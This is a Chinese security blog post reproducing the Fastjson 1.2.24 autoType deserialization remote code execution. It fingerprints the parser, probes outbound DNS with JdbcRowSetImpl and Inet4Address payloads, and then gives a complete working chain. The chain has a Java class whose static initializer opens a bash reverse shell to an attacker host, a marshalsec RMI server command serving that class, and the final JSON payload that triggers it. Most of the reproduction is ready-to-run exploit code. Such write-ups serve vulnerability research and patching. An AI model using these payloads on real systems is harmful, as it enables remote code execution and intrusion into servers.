---
title: FastJson1.2.24复现
date: 2026-10-06 16:28:52
categories:
  - WebSecurity
  - CVE
  - 三方组件
  - FastJson
tags:
  - FastJson
  - 反序列化
  - RCE
  - 漏洞复现
---
## 漏洞原理
Fastjson 是阿里巴巴开发的一款 JSON 解析器。在解析 JSON 的过程中，它支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，攻击者可以构造出恶意利用链。

参考链接：

- [https://www.freebuf.com/vuls/208339.html](https://www.freebuf.com/vuls/208339.html)
- [http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/)
## 漏洞特征

| CNVD-2017-02833 | 无黑名单，`@type` 直接加载类 | 默认开启 | `JdbcRowSetImpl` 触发 JNDI |
| --------------- | ------------------ | ---- | ------------------------ |
|                 |                    |      |                          |


## 漏洞复现
### 1、确认是否存在漏洞风险
破坏json结构，可以判断jackson还是fastjson。构造数据，恶意破坏结构，看后端是否存在采用fastjson解析对应字符串，进行判断是否存在漏洞【参考：https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA】
![](images/Pasted%20image%2020261013123502.png)
![](images/Pasted%20image%2020261013123536.png)
使用@type进一步确认
![](images/Pasted%20image%2020261013123708.png)
### 2、DNS探测是否出网
dns回显
```
{"zero":{"@type":"java.net.Inet4Address","val":"dnslog.com"}}

{"name":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://6o9v16.dnslog.cn/Exploit","autoCommit":true}}
```
![](images/Pasted%20image%2020261013123800.png)

![](images/Pasted%20image%2020261013124040.png)

![](images/Pasted%20image%2020261013124019.png)

![](images/Pasted%20image%2020261006161019.png)
![](images/Pasted%20image%2020261006161031.png)
实现DNS外带信息---fail,fastjson不可
```
jdbc链的dataSource不能外带，不跟log4j的lookup一样，能解析$符号
	{"name":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://${sys:java.version}.nbqgqy.dnslog.cn/Exploit","autoCommit":true}}
intnet可以，但是同样解析不了
	{"zero":{"@type":"java.net.Inet4Address","val":"${sys:java.version}.nbqgqy.dnslog.cn"}}
```

![](images/Pasted%20image%2020261006162359.png)

### 3、JNDI远程加载jar，实现rce

经过尝试，不太好反弹shell，猜测目标机器极简型，最后采用https://github.com/mbechler/marshalsec项目开启rmi服务，反弹shell命令采用原装的
```
String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/vpsip/9999 0>&1"};
```
没有进行base64，因为连接不上
这里涉及三个端口服务：9999为接受反弹shell端口，9090为http服务，1389为rmi开启后提供服务的端口
#### 1、构造poc，并在9090开启http服务
创建TouchFileSecond.java,编译为class
```
import java.lang.Runtime;
import java.lang.Process;

public class TouchFileSecond {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/vpsip/9999 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```
编译
```
javac TouchFileSecond.java
```
该目录下启动http服务
![](images/Pasted%20image%2020261014013632.png)
![](images/Pasted%20image%2020261014013307.png)
#### 2、开启rmi服务，rmi端口为1389用于转9090的http服务恶意文件
```
java -cp /home/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://vpsip:9090/#TouchFileSecond" 1389
```
![](images/Pasted%20image%2020261014013743.png)
#### 3、nc监听9999端口
![](images/Pasted%20image%2020261014013940.png)
#### 4、发送payload实现反弹shell
```
{"b":{

        "@type":"com.sun.rowset.JdbcRowSetImpl",

        "dataSourceName":"rmi://vpsip:1389/TouchFileSecond",

        "autoCommit":true

}}
```
![](images/Pasted%20image%2020261014013906.png)
![](images/Pasted%20image%2020261014012806.png)

![](images/Pasted%20image%2020261014012839.png)